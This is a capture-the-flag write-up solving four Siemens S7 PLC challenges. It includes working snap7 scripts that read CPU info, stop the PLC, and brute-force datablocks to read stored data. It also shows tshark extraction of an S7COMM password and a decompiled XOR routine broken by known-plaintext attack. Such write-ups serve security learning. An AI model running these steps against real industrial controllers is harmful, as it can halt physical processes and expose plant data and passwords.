# Siemens S7 related Write-Ups 
<p align="justify">This folder contains WUs for all the challenges related to Siemens S7 programmable logic controller. Challenges included are:</p>

- Who Am I ?
- Stop This PLC
- A Hidden Value
- Old Proprietary Encryption

## Network 1 - Who Am I 
<p align="justify">This challenge was a Network challenge in which the goal was to interact with Siemens PLC. To do so python provides libraries such as snap7 which embeds a client constructor to interact with a PLC. The code below questions the PLC about hardware components (CPU ...):</p>

````python3
import snap7
client = snap7.client.Client()
client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
print(client.get_cpu_info())
````

FLAG : _ECW{FRLCUR289}_, thanks _DGA_ for this challenge ! 

---

## Network 2 - Stop This PLC

<p align="justify">In this challenge the idea was to stop the PLC. To do so snap7 libraries provides plc_stop() method:</p>

````python3
import snap7
client = snap7.client.Client()
client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
client.plc_stop()
````
<p align="justify">After the PLC was successfuly stopped, we must look at network traffic to see the packet containing the flag being sent :</p>
<p align="center"><img src="./Screenshots/flagPLCs72.png"></p>

FLAG : _ECW{S7-315-stop}_ , Thanks _DGA_ for this challenge !

---

## Network 3 - A Hidden Value

<p align="justify">In this challenge the idea was to read memory Datablocks on the PLC. Datablocks can be seen as raw byte arrays stored on the PLC (or files), identified by a datablock number, and persistent. Those datablocks are used by software  and mostly contain informations about modules... Those datablocks can be freely setup, and here store the flag. To solve this challenge, the first step is to undertsand on which datablocks the flag is stored. The snap7 library provides a method to read (or try to read) the content of the datablock:</p>

````python3
client.db_read(DATABLOCK_ID, DATABLOCK_START_OFFSET, DATABLOCK_LENGTH)
````
<p align="justify">Where: </p>

- _DATABLOCK_ID_ is the DB number
- _DATABLOCK_START_OFFSET_ is the offset in memory from which the data will be read, here 0
- _DATABLOCK_LENGTH_ is the number of bytes read in memory, starting at address of db + offset

<p align="justify">The script below implements db reading and guesses the db ID, at which flag is stored:</p>

````python3
import snap7
client = snap7.client.Client()
client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)

#guess the data block number in memory
for i in range(5000):
	try:
            data = client.db_read(i, 0, 200)
            print(f"[+] Read DB {i}, size of block 200: {data[:16]}...")
            break
        except Exception as e:
            print(f"[X] Error on DB {i}, size of block {j}: {e}")

client.disconnect()
````
<p align="justify">And finally to read the flag: </p>

````python3
import snap7
client = snap7.client.Client()
client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
dbn, size = 6485, 200 #220 => enough to read the flag
buffer = client.db_read(dbn, 0, size)
print(buffer)
````

<p align="center"><img src="./Screenshots/S7_flag3.png"></p>

FLAG : _ECW{Variable-Flag-159}_ , Thanks _DGA_ for this challenge !

---

## Crypto - Old Proprietary Encryption

<p align="justify">This last challenge was a crypto challenge, based on an old encryption algorithm used to encrypt passwords in project files, on SIMATIC device. The goal was to break a password encrypted using the encryption algorithm. To do so, a S7COMM network packets capture was provided, as well as know plaintext passwords with their respective ciphers. </p>

### TCP stream analysis : extract encrypted password hex

<p align="justify">Analyzing the network traffic capture, encrypted password hexa can be extracted from S7COMM Security packets. As a matter of fact, S7COMM protocol doesn't embeds strong security features and most of the traffic is sent in clear.</p>

````bash
tshark -r ECW_PLC_PASSWORD.pcapng -Y "tcp.stream eq 0" | grep pass

#  291  10.56.9.200  10.958265 10.56.9.2    S7COMM 91 ROSCTR:[Userdata] Function:[Request] -> [Security] -> [PLC password]
#  293    10.56.9.2  11.961634 10.56.9.200  S7COMM 87 ROSCTR:[Userdata] Function:[Response] -> [Security] -> [PLC password] -> Errorcode:[0xd602]
#  323  10.56.9.200  22.209712 10.56.9.2    S7COMM 91 ROSCTR:[Userdata] Function:[Request] -> [Security] -> [PLC password]
#  325    10.56.9.2  23.213189 10.56.9.200  S7COMM 87 ROSCTR:[Userdata] Function:[Response] -> [Security] -> [PLC password] -> Errorcode:[0xd602]
#  356  10.56.9.200  29.570897 10.56.9.2    S7COMM 91 ROSCTR:[Userdata] Function:[Request] -> [Security] -> [PLC password]
# 358    10.56.9.2  30.574456 10.56.9.200  S7COMM 87 ROSCTR:[Userdata] Function:[Response] -> [Security] -> [PLC password] -> Errorcode:[0xd602]
# 389  10.56.9.200  47.224956 10.56.9.2    S7COMM 91 ROSCTR:[Userdata] Function:[Request] -> [Security] -> [PLC password]
# 391    10.56.9.2  48.228159 10.56.9.200  S7COMM 87 ROSCTR:[Userdata] Function:[Response] -> [Security] -> [PLC password] -> Errorcode:[0xd602]
# 428  10.56.9.200  86.455321 10.56.9.2    S7COMM 91 ROSCTR:[Userdata] Function:[Request] -> [Security] -> [PLC password]
# 430    10.56.9.2  87.458730 10.56.9.200  S7COMM 87 ROSCTR:[Userdata] Function:[Response] -> [Security] -> [PLC password] -> Errorcode:[0xd602]
# 461  10.56.9.200  98.715999 10.56.9.2    S7COMM 91 ROSCTR:[Userdata] Function:[Request] -> [Security] -> [PLC password]
# 462    10.56.9.2  98.719181 10.56.9.200  S7COMM 87 ROSCTR:[Userdata] Function:[Response] -> [Security] -> [PLC password]
````

````bash
tshark -r ECW_PLC_PASSWORD.pcapng -Y "frame.number == 461" -V


#Frame 461: 91 bytes on wire (728 bits), 91 bytes captured (728 bits) on interface \Device\NPF_{859C0BCE-02B6-4C74-9349-0B0E4DD5A4AB}, id 0
#[***]
#    Data
#        Return code: Success (0xff)
#        Transport size: OCTET STRING (0x09)
#        Length: 8
#        Data: 2539132a0a326e55
````
<p align="justify">The following hex value is finally extracted: </p>

````text
password hex: 2539132a0a326e55
````

### Cryptanalysis on SIMATIC password encryption algorithm

<p align="justify">With the challenge, is provided a list of passwords and their ciphers. Given the hexa cipher retreived , let's now understand how password encryption works under S7COMM.<a href="https://conference.hitb.org/hitbsecconf2021ams/materials/D2%20COMMSEC%20-%20Breaking%20Siemens%20SIMATIC%20S7%20PLC%20Protection%20Mechanism%20-%20Gao%20Jian.pdf">This documentation</a> shows a case of reverse engineering on S7 device, and how PLC passwords are actually encrypted :</p>

````Cpp
int __stdcall sub_1000551B4(char a1, void *Dst)
{
  const void *v2; // eax
  _WORD *v4; // [esp+8h] [ebp-1Ch]
  _WORD *v5; // [esp+Ch] [ebp-18h]
  signed int i; // [esp+14h] [ebp-10h]
	
  if ( !sub_1000D480(&a1) )
    CString::operator=(&a1, off_1009C50C);
  while ( sub_1000D8480(&a1) < 8 )
    CString::operator+=(&a1, 32);
  v2 = (const void *)unknown_libname_203(&a1);
  memcpy(Dst, v2, 8u);
  v4 = Dst;
  v5 = Dst;
  *(_WORD *)Dst ^= 0xAAAAu;
  for ( i = 1; i < 4; ++i )
  {
    ++v4;
    *v4 ^= *v5 ^ 0xAAAA;
    ++v5;
  }
  return CString::~CString((CString *)&a1);
}
````

### Know plaintext attack
<p align="justify">It seems the encryption is indeed very weak and only leverages xor operation over 16 bits WORD to encrypt PLC passwords. It means using a (plaintext | cipher) from the list provided, it's possible to extract the key used to encrypt password, and as a result to revert the encryption. The script attached and named solv_crypto.py implements a KPA and finally outputs the flag:</p>

Flag : _ECW{plcFLM12}_, thanks _DGA_ for this challenge ! 
